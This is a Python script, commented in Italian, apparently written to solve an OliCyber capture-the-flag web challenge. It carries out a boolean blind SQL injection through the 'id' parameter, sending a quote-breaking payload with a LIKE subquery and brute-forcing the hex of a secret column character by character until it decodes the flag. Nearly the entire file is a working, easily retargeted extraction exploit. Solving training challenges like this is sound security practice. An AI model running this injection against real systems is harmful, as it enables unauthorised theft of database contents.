import requests
import string
import sys
import time
from urllib.parse import urlencode

# --- CONFIGURAZIONE CHIAMATA ---

# URL base della challenge (senza parametri)
URL_BASE = 'http://web-17.challs.olicyber.it'
# Nome del parametro vulnerabile (generalmente 'id' in queste sfide)
# Se non è 'id', ADATTALO QUI
PARAM_VULNERABILE = 'id' 

# --- DIZIONARIO E STATO ---

# Dizionario esadecimale (include maiuscole e minuscole per sicurezza, anche se LIKE dovrebbe aiutare)
DICTIONARY = '0123456789abcdefABCDEF' 
result_hex = ''
print("[*] Avvio Blind SQL Injection...")
print(f"[*] Obiettivo: estrarre HEX(asecret) dalla tabella 'secret'")

# --- FUNZIONE DI ATTACCO ---

def attempt_injection(payload: str) -> bool:
    """
    Esegue la richiesta HTTP con il payload e verifica se la risposta è 'Success'.
    
    Args:
        payload: La stringa SQL da iniettare nel parametro vulnerabile.
        
    Returns:
        True se l'iniezione è VERA ('Success' trovato), False altrimenti.
    """
    
    # Costruisce i parametri della richiesta GET
    params = {PARAM_VULNERABILE: payload}
    
    try:
        # Esegui la richiesta. Utilizziamo un timeout per evitare attese infinite.
        r = requests.get(URL_BASE, params=params, timeout=5)
        
        # LOGICA DI VERITÀ (COME FORNITA DALLA CHALLENGE):
        # La challenge suggerisce che una condizione VERA restituisca 'Success'.
        # Quindi cerchiamo la stringa 'Success' nel corpo della risposta HTML.
        
        if "Success" in r.text:
            return True
        else:
            return False

    except requests.exceptions.Timeout:
        # Se c'è un timeout, potrebbe essere un attacco Time-Based
        # (se la sintassi SLEEP fosse usata), ma qui lo trattiamo come FALSO.
        print("[-] Timeout raggiunto durante la richiesta.")
        return False
    except requests.exceptions.RequestException as e:
        print(f"[-] Errore di connessione o richiesta: {e}")
        return False

# --- LOGICA DEL CICLO DI BRUTE-FORCE ---

while True:
    found_char = False
    
    # Cicla su ogni possibile carattere esadecimale (0-9, A-F)
    for c in DICTIONARY:
        current_attempt = result_hex + c
        
        # 1. Costruisci il payload SQL completo:
        #    1' chiude la virgoletta iniziale.
        #    AND (SELECT 1 FROM secret WHERE HEX(asecret) LIKE '...')='1' è la condizione di verità.
        #    # commenta il resto della query originale.
        payload = f"1' AND (SELECT 1 FROM secret WHERE HEX(asecret) LIKE '{current_attempt}%')='1' #"
        
        # Rimuovi il commento per vedere il payload inviato:
        # print(f"   Tentativo: {current_attempt} | Payload: {payload}")
        
        # 2. Testa la condizione
        if attempt_injection(payload):
            # Abbiamo trovato il carattere corretto!
            result_hex += c
            found_char = True
            print(f"[+] Carattere trovato: {c} | Esadecimale parziale: {result_hex}")
            
            # Il carattere successivo è 'c' + 1, quindi usciamo dal ciclo interno e passiamo al carattere successivo
            break
        
    # La sezione 'else' del 'for' (esecuzione se non c'è stato 'break')
    else:
        # Se usciamo dal ciclo 'for' senza trovare un carattere, 
        # significa che la stringa è finita.
        print("\n[*] Nessun altro carattere esadecimale trovato. Fine dell'attacco.")
        break 

# --- DECODIFICA FINALE ---

print("-" * 50)
print(f"Esadecimale finale estratto: {result_hex}")

try:
    if result_hex:
        # Decodifica la stringa esadecimale in ASCII (la flag)
        flag = bytes.fromhex(result_hex).decode('utf-8')
        print(f"🎉 FLAG: {flag}")
    else:
        print("Impossibile decodificare. Nessun esadecimale è stato trovato.")
except Exception as e:
    print(f"⚠️ Errore durante la decodifica Hex in ASCII: {e}")
    print("La stringa esadecimale potrebbe essere incompleta o corrotta.")

print("-" * 50)